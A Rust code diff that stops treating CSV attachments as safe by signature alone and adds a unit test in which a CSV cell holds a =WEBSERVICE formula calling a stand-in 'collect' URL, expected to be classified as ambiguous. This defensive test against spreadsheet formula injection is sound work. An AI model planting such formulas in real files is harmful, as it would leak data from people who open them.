@@ -192,7 +192,7 @@ fn recognized_safe_signature(extension: Option<&str>, bytes: &[u8]) -> bool {
         Some("flac") => bytes.starts_with(b"fLaC"),
         Some("mp3") => bytes.starts_with(b"ID3") || bytes.first() == Some(&0xff),
         Some("mp4" | "m4a" | "m4v" | "mov") => bytes.len() >= 12 && &bytes[4..8] == b"ftyp",
-        Some("txt" | "md" | "csv" | "json") => !bytes.contains(&0),
+        Some("txt" | "md" | "json") => !bytes.contains(&0),
         _ => false,
     }
 }
@@ -358,6 +358,15 @@ mod tests {
         );
         assert_eq!(
             classify_attachment("archive.zip", Some("application/zip"), b"PK\x03\x04").disposition,
+            AttachmentDisposition::Ambiguous
+        );
+        assert_eq!(
+            classify_attachment(
+                "accounts.csv",
+                Some("text/csv"),
+                b"name,total\nAlice,=WEBSERVICE(\"https://example.invalid/collect\")",
+            )
+            .disposition,
             AttachmentDisposition::Ambiguous
         );
     }
